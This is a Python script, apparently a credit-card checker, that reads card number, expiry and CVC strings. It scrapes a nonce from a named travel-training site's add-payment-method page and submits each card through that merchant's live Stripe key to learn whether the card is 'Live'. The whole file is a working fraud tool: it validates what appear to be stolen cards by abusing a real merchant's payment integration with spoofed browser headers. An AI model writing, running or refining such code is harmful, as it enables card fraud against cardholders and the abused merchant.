import requests
import re
import random
import time
import string
from bs4 import BeautifulSoup
import logging
import requests
import re

def Tele(ccx):
    ccx = ccx.strip()
    
    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            raise ValueError("Invalid input format")
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    except (IndexError, ValueError) as e:
        print(f"Error: {e} - Input: {ccx}")
        return

    # Handle year format
    yy = yy[-2:] if len(yy) == 4 else yy

    session = requests.Session()
    
    try:
        # First request to get nonce
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
        }

        response = session.get(
            'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            headers=headers,
            timeout=20
        )
        response.raise_for_status()

        # Extract nonce safely
        html = response.text
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
        if not nonce_match:
            print("Nonce not found")
            return
        nonce = nonce_match.group(1)

        # Stripe API request
        stripe_headers = {
            'authority': 'api.stripe.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        stripe_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=20
        )
        stripe_response.raise_for_status()
        stripe_data = stripe_response.json()

        # Handle subsequent request
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        form_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': stripe_data.get('id', ''),
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        final_response = session.post(
            'https://www.thetravelinstitute.com/',
            params=params,
            data=form_data,
            timeout=20
        )
        final_response.raise_for_status()
        
        return final_response.json().get('msg', 'Live')

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return f"Error: {e}"
    except Exception as e:
        print(f"Unexpected error: {e}")
        return f"Error: {e}"

# Tele1 was a duplicate with syntax errors - removed as redundant
            
